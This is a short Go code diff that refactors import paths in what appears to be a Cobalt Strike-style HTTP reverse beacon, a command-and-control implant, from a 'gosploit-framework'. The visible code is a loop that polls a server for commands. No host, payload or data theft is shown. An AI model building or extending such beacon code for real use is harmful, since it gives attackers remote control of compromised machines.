@@ -2,14 +2,15 @@ package main
 
 import (
 	"bytes"
-	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/command"
-	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/profile"
+	"http_reverse_beacon/command"
+	"http_reverse_beacon/packet"
+	"http_reverse_beacon/profile"
 	"time"
 )
 
 func main() {
 	for {
-		resp := GetCommandRequest()
+		resp := packet.GetCommandRequest()
 		if resp != nil {
 			buf := bytes.NewBuffer([]byte{})
 			buf_size := len(buf.Bytes())
